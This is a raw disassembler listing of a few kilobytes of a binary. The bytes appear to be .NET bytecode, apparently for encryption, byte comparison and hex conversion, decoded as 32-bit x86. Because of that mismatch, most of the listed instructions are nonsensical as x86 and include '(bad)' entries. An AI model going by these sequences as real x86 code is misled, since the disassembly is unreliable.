  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 12             	add    %dh,0x12(%edx)
  4042d8:	28 00                	sub    %al,(%eax)
  4042da:	70 73                	jo     0x40434f
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 40             	add    %dh,0x40(%edx)
  40436b:	28 00                	sub    %al,(%eax)
  40436d:	70 73                	jo     0x4043e2
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	96                   	xchg   %eax,%esi
  404507:	28 00                	sub    %al,(%eax)
  404509:	70 28                	jo     0x404533
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 9c    	or     %dl,-0x638df9f3(%ecx)
  4045a2:	28 00                	sub    %al,(%eax)
  4045a4:	70 09                	jo     0x4045af
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 ac    	or     %dl,-0x538df9f3(%ecx)
  4045ea:	28 00                	sub    %al,(%eax)
  4045ec:	70 09                	jo     0x4045f7
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 12                	add    %dl,(%edx)
  4046dd:	03 28                	add    (%eax),%ebp
  4046df:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046e4:	04 06                	add    $0x6,%al
  4046e6:	17                   	pop    %ss
  4046e7:	58                   	pop    %eax
  4046e8:	0a 08                	or     (%eax),%cl
  4046ea:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  4046ed:	34 00                	xor    $0x0,%al
  4046ef:	00 04 6f             	add    %al,(%edi,%ebp,2)
